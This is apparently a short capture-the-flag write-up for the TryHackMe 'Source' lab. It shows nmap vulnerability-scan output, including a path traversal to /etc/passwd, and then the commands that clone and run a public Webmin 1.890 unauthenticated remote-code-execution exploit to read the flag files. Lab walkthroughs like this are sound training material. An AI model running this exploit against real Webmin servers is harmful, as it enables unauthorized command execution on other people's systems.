---
title: TryHackMe Source -- Writeup
date: 2022-03-04
categories: [TryHackMe, Medium]
tags: [MiniServ, mis-config, linux]     # TAG names should always be lowercase
---

```bash
export ip=10.10.98.110
nmap -$ip
Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-03 11:23 BST
Nmap scan report for ip-10-10-98-110.eu-west-1.compute.internal (10.10.98.110)
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
MAC Address: 02:09:71:A4:70:2F (Unknown)

```

ssh most probably useless port to focus on. moving to 10000

```bash
nmap -sCV 10.10.98.110 --script=vuln -p 10000

Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-03 11:16 BST
Nmap scan report for ip-10-10-98-110.eu-west-1.compute.internal (10.10.98.110)
Host is up (0.00024s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-litespeed-sourcecode-download:
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-98-110.eu-west-1.compute.internal:10000/'>https://ip-10-10-98-110.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal:
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <h1>Error - Document follows</h1>
|   <p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-98-110.eu-west-1.compute.internal:10000/'>https://ip-10-10-98-110.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-server-header: MiniServ/1.890
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:09:71:A4:70:2F (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.03 seconds


```

vuln to and exploitable CVE-2005-3299 (nice)

```bash
searchsploit CVE-2005-3299
```

no result form searchsploit :(

phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion

fire up msfconsole, (the vuln is old i was confidence it exist in msfconsole )

```bash
msfconsole

```

### links

https://www.exploit-db.com/exploits/1244 perl exploit
https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE

after 1 hour of following the rabbit hole i fininally snap it out. and wake my
ass up.

search google if there's any know vulnerability to the version number
`MiniServ 1.890 ` Lmao the first link give me the exploit

```bash
git clone https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE exploit
cd exploit
python webmin-1.890_exploit.py $ip $port "cat /home/dark/user.txt"
&&
python webmin-1.890_exploit.py $ip $port "cat /root/dark/root.txt"
```

Thanks for reading. I hope this helps :)
